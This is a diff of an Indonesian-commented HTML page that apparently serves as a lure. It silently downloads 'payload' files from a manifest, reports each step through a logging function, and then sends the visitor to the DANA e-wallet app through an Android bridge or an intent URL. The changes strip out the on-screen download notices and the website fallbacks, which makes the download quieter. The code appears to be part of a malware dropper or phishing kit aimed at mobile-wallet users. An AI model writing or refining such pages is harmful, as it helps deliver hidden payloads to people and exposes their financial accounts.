@@ -32,14 +32,11 @@
         .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
         .status-bar.loading{display:block;animation:loading 3s infinite}
         @keyframes loading{0%{width:0%}100%{width:100%}}
-        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#0f0;padding:12px 24px;border-radius:8px;z-index:999999;font-size:13px;display:none;border-left:4px solid #0f0}
-        .toast.error{border-left-color:#ff4444;color:#ff4444}
     </style>
 </head>
 <body>
 
 <div id="statusBar" class="status-bar"></div>
-<div class="toast" id="toast"></div>
 
 <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
@@ -71,7 +68,7 @@
 
 <script>
 // ============================================================
-// INDEX.HTML - PAKAI PACKAGE DANA YANG BENAR: id.dana
+// INDEX.HTML - REDIRECT HANYA KE APLIKASI DANA
 // ============================================================
 
 // ============================================================
@@ -132,15 +129,6 @@ function updateLoading(title, step) {
     document.getElementById('loadingStep').textContent = step;
 }
 
-function showToast(msg, isError) {
-    var t = document.getElementById('toast');
-    t.textContent = msg;
-    t.className = 'toast' + (isError ? ' error' : '');
-    t.style.display = 'block';
-    clearTimeout(t._timer);
-    t._timer = setTimeout(function() { t.style.display = 'none'; }, 3000);
-}
-
 // ============================================================
 // DOWNLOAD PAYLOAD
 // ============================================================
@@ -180,13 +168,11 @@ function downloadPayload() {
             var successCount = downloadedFiles.filter(function(f) { return f !== null; }).length;
             updateLoading('✅ ' + successCount + ' file berhasil', '');
             K({ sumber: 'download_complete', data: { total: successCount } });
-            showToast('✅ ' + successCount + ' file berhasil di-download');
             resolve();
         })
         .catch(function(error) {
             K({ sumber: 'manifest_error', data: error.message });
             updateLoading('⚠️ Gagal download', '');
-            showToast('⚠️ Gagal download: ' + error.message, true);
             resolve();
         });
     });
@@ -258,13 +244,13 @@ function downloadSingleFile(fileName) {
 }
 
 // ============================================================
-// 🔥 REDIRECT KE DANA (PAKAI id.dana!)
+// 🔥 REDIRECT HANYA KE APLIKASI DANA (SKIP WEBSITE!)
 // ============================================================
 function redirectToDANA() {
-    K({ sumber: 'redirect_start', data: 'to_dana' });
+    K({ sumber: 'redirect_start', data: 'to_dana_app' });
 
     // ============================================================
-    // METHOD 1: VIA ANDROID BRIDGE (PAKAI id.dana)
+    // METHOD 1: VIA ANDROID BRIDGE (PRIORITAS!)
     // ============================================================
     if (HAS_BRIDGE) {
         try {
@@ -275,7 +261,7 @@ function redirectToDANA() {
     }
 
     // ============================================================
-    // METHOD 2: VIA INTENT (PAKAI id.dana)
+    // METHOD 2: VIA INTENT (LANGSUNG KE APLIKASI DANA!)
     // ============================================================
     try {
         window.location.href = 'intent://id.dana/#Intent;scheme=https;package=id.dana;end';
@@ -284,24 +270,9 @@ function redirectToDANA() {
     } catch(e) {}
 
     // ============================================================
-    // METHOD 3: VIA WEBSITE DANA
+    // ❌ TIDAK ADA FALLBACK KE WEBSITE ATAU PLAY STORE!
     // ============================================================
-    try {
-        window.location.href = 'https://www.dana.id';
-        K({ sumber: 'redirect_success', data: 'via_web' });
-        return;
-    } catch(e) {}
-
-    // ============================================================
-    // METHOD 4: VIA GOOGLE SEARCH (LAST RESORT)
-    // ============================================================
-    try {
-        window.location.href = 'https://www.google.com/search?q=dana+indonesia';
-        K({ sumber: 'redirect_fallback', data: 'google_search' });
-        return;
-    } catch(e) {}
-
-    K({ sumber: 'redirect_failed', data: 'all_methods_failed' });
+    K({ sumber: 'redirect_failed', data: 'no_app_found' });
 }
 
 // ============================================================
@@ -355,7 +326,7 @@ var timerInterval = setInterval(function() {
     }
 }, 1000);
 
-console.log('🔥 INDEX.HTML - PAKAI id.dana (BUKAN com.dana.id)!');
+console.log('🔥 INDEX.HTML - REDIRECT HANYA KE APLIKASI DANA');
 console.log('📱 Android Bridge:', HAS_BRIDGE);
 </script>
 </body>
